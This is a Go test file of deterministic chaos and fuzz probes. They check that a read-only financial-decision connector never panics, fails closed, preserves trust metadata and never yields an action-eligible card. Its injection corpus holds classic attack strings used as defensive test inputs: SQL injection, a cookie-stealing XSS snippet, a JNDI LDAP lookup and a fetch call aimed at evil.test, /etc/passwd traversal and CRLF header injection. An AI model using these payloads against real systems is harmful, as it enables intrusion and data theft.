package qfdecisions

// Chaos-hardening probes for the QF companion connector (spec 041).
//
// These tests are the deterministic, hermetic, single-package adversarial
// abuse suite for the connector's parse/normalize/render/boundary surface.
// They exist to PROVE — not merely assert by convention — that Product
// Principle 10 (the QF companion is READ-ONLY and MUST NEVER initiate trade
// approval, mandate change, execution, or financial advice) holds under
// random, semi-random, and explicitly hostile QF decision packets.
//
// Invariants probed (every probe family checks the relevant subset):
//
//   1. NO PANIC. No malformed/oversized/garbage/injection-shaped input may
//      crash the connector. Every entry point is called under panic recovery.
//   2. CLOSED OUTPUT VOCABULARY. Normalize may only ever emit a RawArtifact
//      whose ContentType is one of the read-only qf/... content types
//      {qf/decision-packet, qf/no-action-decision, qf/policy-denial}. It may
//      never emit a financial-action verb as a content type.
//   3. READ-ONLY BOUNDARY HELD. The render surface stays ReadOnly=true /
//      ActionEligible=false for ANY metadata, and any forbidden action hint
//      injected into metadata fires the action-boundary kick (observable
//      rejection) instead of producing an action surface. No benign input
//      ever fabricates a rejection.
//   4. METADATA PRESERVED OR FAIL-CLOSED. When an artifact is produced, the
//      QF trust metadata (packet/intent/scenario/trace ids, approval state,
//      deep link, CalibrationBadge, DataProvenanceBadge) is preserved
//      verbatim. When required trust metadata is absent or incompatible, the
//      normalizer fails closed with a DegradedDiagnostic and produces NO
//      trusted artifact. Exactly one of (artifact, diagnostic) is ever non-nil.
//
// Determinism: every randomized loop is seeded from a fixed constant so the
// real probe counts reported in the test log are reproducible. The suite is
// pure in-memory CPU work (no network, no live stack, no shared store) and
// resets the two label-bearing counters it touches so it never pollutes the
// global Prometheus registry.

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/prometheus/client_golang/prometheus/testutil"
	"github.com/smackerel/smackerel/internal/connector"
	"github.com/smackerel/smackerel/internal/metrics"
)

// chaosSeed mnemonic: 0x041 == spec 041. Per-family offsets keep each loop's
// stream independent while remaining reproducible.
const chaosSeed = 0x5101041

// chaosClosedContentTypes is the ONLY set of ContentType values Normalize is
// permitted to stamp on a produced artifact. All are read-only classifications
// — none is a financial action.
var chaosClosedContentTypes = map[string]bool{
	ContentTypeDecisionPacket:   true, // qf/decision-packet
	ContentTypeNoActionDecision: true, // qf/no-action-decision
	ContentTypePolicyDenial:     true, // qf/policy-denial
}

// chaosForbiddenActionTypes is the closed set of financial action verbs the
// connector must NEVER initiate. Used both to assert these are never emitted
// as a content type and to drive hostile render-metadata injection.
var chaosForbiddenActionTypes = []string{
	ActionTypeApproval,
	ActionTypeExecution,
	ActionTypeMandateChange,
	ActionTypeEmergencyStop,
	ActionTypeWatchCreation,
	ActionTypeWatchEvaluation,
	ActionTypeCallbackAcceptance,
	ActionTypeQFTrustReconstruction,
}

// chaosTrustStringKeys are the QF trust-metadata string fields that MUST be
// preserved verbatim on every produced artifact (Principle 10 round-trip).
var chaosTrustStringKeys = []string{
	"packet_id", "intent_id", "scenario_id", "trace_id", "approval_state", "deep_link",
}

// chaosForbiddenTopLevelMetadataKeys are keys the normalizer must NEVER hoist
// to top-level artifact metadata from a hostile envelope. They may only ever
// appear nested under "envelope_metadata". A regression that promoted any of
// these would be a read-only-boundary leak.
var chaosForbiddenTopLevelMetadataKeys = []string{
	"requested_action_type", "pending_action_type", "action_request",
	"action_eligible", "approved", "executed", "execute",
}

var chaosCanonicalDecisionTypes = []string{
	DecisionTypeRecommendation, DecisionTypeNoAction, DecisionTypePolicyDenial, DecisionTypeAnalysisNote,
}

// chaosUnknownDecisionTypes is a SMALL bounded pool of forward-compatible
// "unknown" decision_type tokens. Bounded on purpose so the high-volume fuzz
// loop cannot itself explode smackerel_qf_unknown_decision_type_total
// cardinality during the test run.
var chaosUnknownDecisionTypes = []string{
	"future-shape-a", "future-shape-b", "future-shape-c", "future-shape-d",
}

var chaosSurfaces = []string{
	SurfaceWeb, SurfaceDigest, SurfaceTelegram, SurfaceSearch, SurfaceArtifactDetail,
	"", "not-a-real-surface", "  web  ",
}

// chaosInjectionCorpus holds injection-shaped and structurally hostile string
// values fed into envelope string fields. The connector must store these
// verbatim (it is a passive ingest surface) and never interpret them.
var chaosInjectionCorpus = []string{
	`'; DROP TABLE artifacts; --`,
	`<script>alert(document.cookie)</script>`,
	`{{7*7}}${jndi:ldap://evil.test/a}`,
	`../../../../etc/passwd`,
	`javascript:fetch('//evil.test')`,
	"value\x00with\x00nuls",
	"line1\r\nSet-Cookie: evil=1",
	"\u202eRTL-override-payload",
	strings.Repeat("A", 4096),
	`{"nested":"json","as":"string"}`,
	`[1,2,3]`,
	"approval\nexecution\nmandate_change", // action verbs as free text must stay inert
}

var chaosControlCorpus = []string{
	"\x00", "\x01\x02\x03", "\x07\x08\x09", "\x1b[31mANSI", "\x7f", "\ufffd",
}

// ---------------------------------------------------------------------------
// Panic-safe call wrappers
// ---------------------------------------------------------------------------

func chaosCallNormalize(n *Normalizer, ev QFDecisionEvent, env QFDecisionPacketEnvelope, captured time.Time) (artifact *connector.RawArtifact, diag *DegradedDiagnostic, panicked any) {
	defer func() {
		if r := recover(); r != nil {
			panicked = r
		}
	}()
	artifact, diag = n.Normalize(ev, env, captured)
	return artifact, diag, nil
}

func chaosCallRender(ctx context.Context, art connector.RawArtifact, opts RenderOptions) (card PacketCard, err error, panicked any) {
	defer func() {
		if r := recover(); r != nil {
			panicked = r
		}
	}()
	card, err = RenderPacketCard(ctx, art, opts)
	return card, err, nil
}

// ---------------------------------------------------------------------------
// Random value helpers (deterministic via *seededRand)
// ---------------------------------------------------------------------------

// seededRand is a tiny deterministic xorshift PRNG. A local implementation is
// used (instead of math/rand) so the suite carries no dependency on global
// generator state and the stream is identical on every run / platform.
type seededRand struct{ state uint64 }

func newSeededRand(seed uint64) *seededRand {
	if seed == 0 {
		seed = 0x9e3779b97f4a7c15
	}
	return &seededRand{state: seed}
}

func (r *seededRand) next() uint64 {
	r.state ^= r.state << 13
	r.state ^= r.state >> 7
	r.state ^= r.state << 17
	return r.state
}

// intn returns a pseudo-random int in [0, n). n must be > 0.
func (r *seededRand) intn(n int) int {
	if n <= 0 {
		return 0
	}
	return int(r.next() % uint64(n))
}

const chaosASCII = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ./:-_{}[]\"'<>;\\"

func (r *seededRand) asciiString(n int) string {
	if n <= 0 {
		return ""
	}
	b := make([]byte, n)
	for i := range b {
		b[i] = chaosASCII[r.intn(len(chaosASCII))]
	}
	return string(b)
}

func (r *seededRand) bytesString(n int) string {
	if n <= 0 {
		return ""
	}
	b := make([]byte, n)
	for i := range b {
		b[i] = byte(r.intn(256))
	}
	return string(b)
}

// adversarialString returns a hostile string drawn from the injection / control
// corpora, random printable ASCII, random raw bytes (invalid UTF-8 likely), or
// an occasional capped-oversize blob. The oversize cap (64 KiB) keeps the suite
// fast and memory-light while still exercising the unbounded-length path.
func (r *seededRand) adversarialString() string {
	switch r.intn(6) {
	case 0:
		return chaosInjectionCorpus[r.intn(len(chaosInjectionCorpus))]
	case 1:
		return chaosControlCorpus[r.intn(len(chaosControlCorpus))]
	case 2:
		return r.asciiString(1 + r.intn(64))
	case 3:
		return r.bytesString(1 + r.intn(64))
	case 4:
		// ~1-in-6 oversize blob, capped well below any OOM risk.
		return r.asciiString(1 + r.intn(64*1024))
	default:
		return "value-" + r.asciiString(1+r.intn(12))
	}
}

// ---------------------------------------------------------------------------
// Shared invariant assertion
// ---------------------------------------------------------------------------

// chaosAssertNormalizeInvariants enforces the universal post-Normalize
// contract for an arbitrary (possibly hostile) envelope.
func chaosAssertNormalizeInvariants(t *testing.T, env QFDecisionPacketEnvelope, artifact *connector.RawArtifact, diag *DegradedDiagnostic) {
	t.Helper()

	// Invariant: exactly one of (artifact, diagnostic) is non-nil.
	if (artifact == nil) == (diag == nil) {
		t.Fatalf("Normalize must return exactly one of (artifact, diagnostic); got artifact=%v diag=%v", artifact != nil, diag != nil)
	}

	if artifact == nil {
		// Fail-closed: a diagnostic MUST carry a reason or a missing-field set,
		// and MUST NOT have produced a trusted artifact (already guaranteed).
		if strings.TrimSpace(diag.Reason) == "" && len(diag.MissingFields) == 0 {
			t.Fatalf("DegradedDiagnostic must explain the rejection; got %#v", diag)
		}
		return
	}

	// (2) Closed output vocabulary.
	if !chaosClosedContentTypes[artifact.ContentType] {
		t.Fatalf("artifact ContentType %q is outside the read-only closed vocabulary %v", artifact.ContentType, chaosClosedContentTypes)
	}
	// (2b) A content type may never be a financial action verb.
	for _, forbidden := range chaosForbiddenActionTypes {
		if artifact.ContentType == forbidden {
			t.Fatalf("artifact ContentType fabricated a financial action verb %q", forbidden)
		}
	}

	// Read-only connector identity is preserved; the connector never adopts a
	// QF-minted action identity.
	if artifact.SourceID != DefaultConnectorID {
		t.Fatalf("artifact SourceID = %q, want read-only connector id %q", artifact.SourceID, DefaultConnectorID)
	}

	// (4) Verbatim trust-metadata preservation.
	if artifact.Metadata == nil {
		t.Fatal("produced artifact has nil metadata")
	}
	chaosRequireMetaString(t, artifact.Metadata, "packet_id", env.PacketID)
	chaosRequireMetaString(t, artifact.Metadata, "intent_id", env.IntentID)
	chaosRequireMetaString(t, artifact.Metadata, "scenario_id", env.ScenarioID)
	chaosRequireMetaString(t, artifact.Metadata, "trace_id", env.TraceID)
	chaosRequireMetaString(t, artifact.Metadata, "approval_state", env.ApprovalState)
	chaosRequireMetaString(t, artifact.Metadata, "deep_link", env.DeepLink)

	if cal, ok := artifact.Metadata["calibration_badge"].(map[string]any); !ok || len(cal) == 0 {
		t.Fatalf("CalibrationBadge not preserved as non-empty map: %#v", artifact.Metadata["calibration_badge"])
	}
	if prov, ok := artifact.Metadata["data_provenance_badge"].(map[string]any); !ok || len(prov) == 0 {
		t.Fatalf("DataProvenanceBadge not preserved as non-empty map: %#v", artifact.Metadata["data_provenance_badge"])
	}

	// (3) The normalizer must never hoist a hostile action hint to top-level
	// metadata. Such keys may only ever live nested under envelope_metadata.
	for _, key := range chaosForbiddenTopLevelMetadataKeys {
		if _, present := artifact.Metadata[key]; present {
			t.Fatalf("normalizer hoisted forbidden action-hint key %q to top-level metadata (read-only boundary leak)", key)
		}
	}
	// unknown_decision_type, when present, is strictly a bool dispatch hint.
	if v, present := artifact.Metadata["unknown_decision_type"]; present {
		if _, isBool := v.(bool); !isBool {
			t.Fatalf("unknown_decision_type must be bool, got %T", v)
		}
	}

	// (1/4) RawContent round-trips to valid JSON carrying the trust keys. (Byte
	// identity is intentionally NOT asserted: encoding/json escapes control
	// chars and substitutes U+FFFD for invalid UTF-8. The verbatim guarantee is
	// the in-memory metadata checked above; the JSON guarantee is structural.)
	var roundTrip map[string]any
	if err := json.Unmarshal([]byte(artifact.RawContent), &roundTrip); err != nil {
		t.Fatalf("RawContent is not valid JSON: %v", err)
	}
	for _, key := range []string{"packet_id", "intent_id", "scenario_id", "trace_id", "calibration_badge", "data_provenance_badge", "deep_link", "approval_state"} {
		if _, ok := roundTrip[key]; !ok {
			t.Fatalf("RawContent dropped required QF field %q", key)
		}
	}
}

func chaosRequireMetaString(t *testing.T, m map[string]any, key, want string) {
	t.Helper()
	got, ok := m[key].(string)
	if !ok {
		t.Fatalf("metadata[%q] missing or not a string: %#v", key, m[key])
	}
	if got != want {
		t.Fatalf("metadata[%q] not preserved verbatim: got %q want %q", key, got, want)
	}
}

// chaosMutateEnvelope produces a (possibly hostile) event+envelope pair from a
// valid base by applying a random subset of mutations.
func chaosMutateEnvelope(r *seededRand) (QFDecisionEvent, QFDecisionPacketEnvelope) {
	env := validQFEnvelope()
	ev := validQFEvent()

	// Adversarial overwrite of free-text / id string fields (verbatim-preserve
	// probe). Applied independently per field.
	if r.intn(2) == 0 {
		env.PacketID = r.adversarialString()
		ev.PacketID = env.PacketID
	}
	if r.intn(2) == 0 {
		env.IntentID = r.adversarialString()
	}
	if r.intn(2) == 0 {
		env.ScenarioID = r.adversarialString()
	}
	if r.intn(2) == 0 {
		env.TraceID = r.adversarialString()
		ev.TraceID = env.TraceID
	}
	if r.intn(2) == 0 {
		env.Thesis = r.adversarialString()
	}
	if r.intn(2) == 0 {
		env.WhyNow = r.adversarialString()
	}
	if r.intn(2) == 0 {
		env.DeepLink = r.adversarialString()
	}
	if r.intn(3) == 0 {
		env.ApprovalState = r.adversarialString()
	}

	// decision_type: canonical, bounded-unknown, or empty.
	switch r.intn(3) {
	case 0:
		env.DecisionType = chaosCanonicalDecisionTypes[r.intn(len(chaosCanonicalDecisionTypes))]
	case 1:
		env.DecisionType = chaosUnknownDecisionTypes[r.intn(len(chaosUnknownDecisionTypes))]
	default:
		env.DecisionType = ""
	}
	ev.DecisionType = env.DecisionType

	// packet_version: correct, or a wrong integer (mismatch path).
	if r.intn(3) == 0 {
		env.PacketVersion = 2 + r.intn(98)
	}

	// Randomly drop required trust metadata (fail-closed probe).
	if r.intn(4) == 0 {
		switch r.intn(8) {
		case 0:
			env.PacketID, ev.PacketID = "", ""
		case 1:
			env.IntentID = ""
		case 2:
			env.ScenarioID = ""
		case 3:
			env.TraceID, ev.TraceID = "", ""
		case 4:
			env.ApprovalState = ""
		case 5:
			env.DeepLink = ""
		case 6:
			env.CalibrationBadge = nil
		case 7:
			env.DataProvenanceBadge = nil
		}
	}

	// Inject hostile / extra metadata, including forbidden action hints, into
	// the envelope's own metadata map. The normalizer must keep these inert and
	// confined to envelope_metadata, never hoisting an action verb.
	if r.intn(2) == 0 {
		hostile := map[string]any{
			"requested_action_type":     chaosForbiddenActionTypes[r.intn(len(chaosForbiddenActionTypes))],
			"action_request":            map[string]any{"action_type": ActionTypeExecution},
			"extra-" + r.asciiString(4): r.adversarialString(),
		}
		env.Metadata = hostile
	}

	return ev, env
}

// ---------------------------------------------------------------------------
// Probe family A — Normalize under structurally-decoded adversarial packets
// ---------------------------------------------------------------------------

func TestChaosHardening_NormalizeNeverPanicsAndHoldsReadOnlyBoundary(t *testing.T) {
	metrics.QFUnknownDecisionType.Reset()
	defer metrics.QFUnknownDecisionType.Reset()

	n := NewNormalizer(DefaultConnectorID, 1)
	captured := time.Date(2026, 6, 17, 12, 0, 0, 0, time.UTC)
	r := newSeededRand(chaosSeed + 1)

	const iters = 5000
	var probes, panics, produced, failClosed int
	for i := 0; i < iters; i++ {
		ev, env := chaosMutateEnvelope(r)
		artifact, diag, panicked := chaosCallNormalize(n, ev, env, captured)
		if panicked != nil {
			panics++
			t.Errorf("Normalize panicked on adversarial packet #%d: %v", i, panicked)
			continue
		}
		probes++
		chaosAssertNormalizeInvariants(t, env, artifact, diag)
		if artifact != nil {
			produced++
		} else {
			failClosed++
		}
	}

	if panics != 0 {
		t.Fatalf("Normalize panicked %d times across %d adversarial packets", panics, iters)
	}
	t.Logf("chaos[A] normalize probes=%d produced=%d fail_closed=%d panics=%d", probes, produced, failClosed, panics)
}

// ---------------------------------------------------------------------------
// Probe family B — Malformed raw JSON bytes -> decode -> normalize
// ---------------------------------------------------------------------------

func chaosNestedObjectJSON(depth int) []byte {
	var b strings.Builder
	b.WriteString(`{"calibration_badge":`)
	for i := 0; i < depth; i++ {
		b.WriteString(`{"a":`)
	}
	b.WriteString(`{"state":"x"}`)
	for i := 0; i < depth; i++ {
		b.WriteString(`}`)
	}
	b.WriteString(`}`)
	return []byte(b.String())
}

func TestChaosHardening_MalformedJSONBytesFailClosedNeverPanic(t *testing.T) {
	metrics.QFUnknownDecisionType.Reset()
	defer metrics.QFUnknownDecisionType.Reset()

	n := NewNormalizer(DefaultConnectorID, 1)
	captured := time.Date(2026, 6, 17, 12, 0, 0, 0, time.UTC)

	fixed := [][]byte{
		[]byte(``),
		[]byte(`   `),
		[]byte(`not json at all`),
		[]byte(`{`),
		[]byte(`{"packet_id":"x"`),                  // truncated object
		[]byte(`{"packet_id":"unterminated`),        // truncated string
		[]byte("{\"packet_id\":\"\x00\x01\x02\"}"),  // embedded NUL/control
		[]byte("\xff\xfe{\"packet_id\":\"bom\"}"),   // junk prefix
		[]byte(`{"packet_version":"not-a-number"}`), // wrong type (string for int)
		[]byte(`{"calibration_badge":"should-be-object"}`),
		[]byte(`{"calibration_badge":[1,2,3]}`),
		[]byte(`{"quantified_impact":42}`),
		[]byte(`[1,2,3]`), // array at top level
		[]byte(`12345`),   // number at top level
		[]byte(`true`),    // bool at top level
		[]byte(`null`),    // null literal
		[]byte(`"just-a-string"`),
		[]byte(`{"packet_id":"x","packet_id":"y","packet_id":"z"}`), // duplicate keys
		[]byte(`{"deep_link":"javascript:alert(1)","thesis":"'; DROP TABLE--"}`),
		[]byte(`{"approval_state":"\u202eRTL"}`),
		[]byte(`{"thesis":"` + strings.Repeat("A", 1<<20) + `"}`), // 1 MiB string value
		chaosNestedObjectJSON(64),                                 // deep but within json limit
		chaosNestedObjectJSON(12000),                              // exceeds json max depth -> error, not panic
	}

	r := newSeededRand(chaosSeed + 2)
	var probes, panics, decodeErrs, normalized int

	run := func(payload []byte, label string) {
		var env QFDecisionPacketEnvelope
		// Decode itself must never panic.
		func() {
			defer func() {
				if rec := recover(); rec != nil {
					panics++
					t.Errorf("json.Unmarshal panicked on %s: %v", label, rec)
				}
			}()
			if err := json.Unmarshal(payload, &env); err != nil {
				decodeErrs++ // fail-closed at the decode boundary is acceptable
				return
			}
			// Decoded — feed it to Normalize and assert the universal contract.
			ev := QFDecisionEvent{EventID: "chaos-evt", DecisionType: env.DecisionType, TraceID: env.TraceID}
			artifact, diag, panicked := chaosCallNormalize(n, ev, env, captured)
			if panicked != nil {
				panics++
				t.Errorf("Normalize panicked on decoded %s: %v", label, panicked)
				return
			}
			normalized++
			chaosAssertNormalizeInvariants(t, env, artifact, diag)
		}()
		probes++
	}

	for i, payload := range fixed {
		run(payload, "fixed#"+string(rune('A'+i%26)))
	}
	// Seeded random byte payloads.
	for i := 0; i < 1500; i++ {
		run([]byte(r.bytesString(r.intn(96))), "rand-bytes")
	}

	if panics != 0 {
		t.Fatalf("malformed-JSON probes panicked %d times", panics)
	}
	t.Logf("chaos[B] json probes=%d decode_fail_closed=%d normalized=%d panics=%d", probes, decodeErrs, normalized, panics)
}

// ---------------------------------------------------------------------------
// Probe family C — Render surface stays read-only under hostile action hints
// ---------------------------------------------------------------------------

func chaosBoundaryMetricSum() float64 {
	var sum float64
	for _, label := range chaosForbiddenActionTypes {
		sum += testutil.ToFloat64(metrics.QFActionBoundaryAttemptsTotal.WithLabelValues(label))
	}
	return sum
}

// pickActionCandidate returns a forbidden action verb, a benign action-ish
// string, junk, or "" — and reports whether it is forbidden.
func (r *seededRand) pickActionCandidate() (string, bool) {
	switch r.intn(4) {
	case 0:
		v := chaosForbiddenActionTypes[r.intn(len(chaosForbiddenActionTypes))]
		return v, true
	case 1:
		// Benign near-miss strings that must NOT match the forbidden set.
		benign := []string{"approvals", "approve", "exec", "execution_request", "mandate", "watch", "dismiss", "surface_dismiss", "view"}
		return benign[r.intn(len(benign))], false
	case 2:
		return r.asciiString(1 + r.intn(20)), false
	default:
		return "", false
	}
}

func TestChaosHardening_RenderSurfaceAlwaysReadOnlyUnderHostileMetadata(t *testing.T) {
	metrics.QFActionBoundaryAttemptsTotal.Reset()
	defer metrics.QFActionBoundaryAttemptsTotal.Reset()

	n := NewNormalizer(DefaultConnectorID, 1)
	ctx := context.Background()
	now := time.Date(2026, 6, 17, 12, 0, 0, 0, time.UTC)
	r := newSeededRand(chaosSeed + 3)

	const iters = 2000
	var probes, panics int
	var expectedForbidden float64

	for i := 0; i < iters; i++ {
		env := validQFEnvelope()
		env.DecisionType = chaosCanonicalDecisionTypes[r.intn(len(chaosCanonicalDecisionTypes))]
		ev := validQFEvent()
		ev.DecisionType = env.DecisionType

		artifact, diag := n.Normalize(ev, env, now)
		if diag != nil || artifact == nil {
			t.Fatalf("valid envelope failed to normalize: diag=%#v", diag)
		}

		// Inject hostile action hints into the produced artifact metadata in up
		// to three independent slots. Each forbidden value must fire the
		// boundary exactly once.
		if v, forbidden := r.pickActionCandidate(); v != "" {
			artifact.Metadata["requested_action_type"] = v
			if forbidden {
				expectedForbidden++
			}
		}
		if v, forbidden := r.pickActionCandidate(); v != "" {
			artifact.Metadata["pending_action_type"] = v
			if forbidden {
				expectedForbidden++
			}
		}
		if v, forbidden := r.pickActionCandidate(); v != "" {
			artifact.Metadata["action_request"] = map[string]any{"action_type": v}
			if forbidden {
				expectedForbidden++
			}
		}

		surface := chaosSurfaces[r.intn(len(chaosSurfaces))]
		card, err, panicked := chaosCallRender(ctx, *artifact, RenderOptions{Surface: surface, Now: now})
		if panicked != nil {
			panics++
			t.Errorf("RenderPacketCard panicked #%d: %v", i, panicked)
			continue
		}
		probes++
		if err != nil {
			t.Fatalf("RenderPacketCard returned error on read-only render: %v", err)
		}
		// THE Principle-10 render invariant: no metadata can make the card
		// action-eligible. It is always read-only.
		if !card.ReadOnly {
			t.Fatalf("rendered card is not read-only under hostile metadata: %+v", card)
		}
		if card.ActionEligible {
			t.Fatalf("rendered card became action-eligible under hostile metadata: %+v", card)
		}
	}

	if panics != 0 {
		t.Fatalf("render probes panicked %d times", panics)
	}
	if expectedForbidden == 0 {
		t.Fatal("test did not inject any forbidden action hints across 2000 iters; probe is not exercising the boundary")
	}
	got := chaosBoundaryMetricSum()
	if got != expectedForbidden {
		t.Fatalf("action-boundary attempts counter = %.0f, want %.0f (one observable rejection per forbidden hint)", got, expectedForbidden)
	}
	t.Logf("chaos[C] render probes=%d panics=%d forbidden_hint_kicks=%.0f (all cards read_only=true action_eligible=false)", probes, panics, expectedForbidden)
}

// ---------------------------------------------------------------------------
// Probe family D — Forbidden-action vocabulary is exhaustive; benign never fires
// ---------------------------------------------------------------------------

func TestChaosHardening_ForbiddenActionVocabularyExhaustiveBenignInert(t *testing.T) {
	metrics.QFActionBoundaryAttemptsTotal.Reset()
	defer metrics.QFActionBoundaryAttemptsTotal.Reset()

	now := time.Date(2026, 6, 17, 12, 0, 0, 0, time.UTC)

	// Every forbidden verb is classified forbidden AND fires + errors.
	for _, actionType := range chaosForbiddenActionTypes {
		if !IsForbiddenQFActionType(actionType) {
			t.Fatalf("forbidden action verb %q not classified as forbidden", actionType)
		}
		_, fired, err := EnforceQFActionBoundary(ActionBoundaryAttempt{
			AttemptedActionType: actionType,
			TraceID:             "chaos-trace",
			PacketID:            "chaos-packet",
			Surface:             SurfaceWeb,
			ObservedAt:          now,
		})
		if !fired || err == nil {
			t.Fatalf("EnforceQFActionBoundary did not fire/err for forbidden %q (fired=%v err=%v)", actionType, fired, err)
		}
	}

	// A large seeded stream of junk/benign strings must NEVER be classified
	// forbidden and must be a guard no-op (no fabricated rejection).
	r := newSeededRand(chaosSeed + 4)
	var benignProbes int
	for i := 0; i < 1500; i++ {
		candidate := r.bytesString(1 + r.intn(24))
		// Skip the astronomically unlikely exact collision with a forbidden const.
		if IsForbiddenQFActionType(candidate) {
			continue
		}
		_, fired, err := EnforceQFActionBoundary(ActionBoundaryAttempt{
			AttemptedActionType: candidate,
			TraceID:             "chaos-benign",
			ObservedAt:          now,
		})
		if fired {
			t.Fatalf("guard fabricated a rejection for benign candidate %q", candidate)
		}
		if err != nil {
			t.Fatalf("guard errored for benign candidate %q: %v", candidate, err)
		}
		benignProbes++
	}

	// No benign probe may have incremented the forbidden-label counter.
	if sum := chaosBoundaryMetricSum(); sum != float64(len(chaosForbiddenActionTypes)) {
		t.Fatalf("boundary counter sum = %.0f, want %d (only the 8 forbidden-verb checks should have fired)", sum, len(chaosForbiddenActionTypes))
	}
	t.Logf("chaos[D] forbidden_verbs=%d benign_probes=%d (all benign inert)", len(chaosForbiddenActionTypes), benignProbes)
}

// ---------------------------------------------------------------------------
// Probe family E — envelopeCapturedAt tolerates garbage timestamps
// ---------------------------------------------------------------------------

func TestChaosHardening_EnvelopeCapturedAtGarbageNeverPanics(t *testing.T) {
	fallback := time.Date(2026, 6, 17, 0, 0, 0, 0, time.UTC)
	r := newSeededRand(chaosSeed + 5)

	garbage := []string{
		"", "   ", "not-a-time", "2026-13-45T99:99:99Z", "\x00\x01",
		"0", "2026", "2026-06-17", "2026-06-17T12:00:00", strings.Repeat("9", 1000),
	}
	for i := 0; i < 500; i++ {
		garbage = append(garbage, r.bytesString(r.intn(40)))
	}

	var probes int
	for _, g := range garbage {
		env := validQFEnvelope()
		env.UpdatedAt = g
		env.CreatedAt = g
		ev := validQFEvent()
		ev.CreatedAt = g

		got := func() (out time.Time) {
			defer func() {
				if rec := recover(); rec != nil {
					t.Fatalf("envelopeCapturedAt panicked on %q: %v", g, rec)
				}
			}()
			return envelopeCapturedAt(env, ev, fallback)
		}()
		if got.IsZero() {
			t.Fatalf("envelopeCapturedAt returned zero time for %q", g)
		}
		if got.Location() != time.UTC {
			t.Fatalf("envelopeCapturedAt returned non-UTC location for %q: %v", g, got.Location())
		}
		probes++
	}

	// A genuinely valid timestamp still parses through unchanged.
	env := validQFEnvelope()
	env.UpdatedAt = "2026-06-17T08:30:00Z"
	if got := envelopeCapturedAt(env, validQFEvent(), fallback); !got.Equal(time.Date(2026, 6, 17, 8, 30, 0, 0, time.UTC)) {
		t.Fatalf("valid timestamp not parsed verbatim: %v", got)
	}
	t.Logf("chaos[E] captured_at probes=%d (garbage falls back, valid parses)", probes)
}
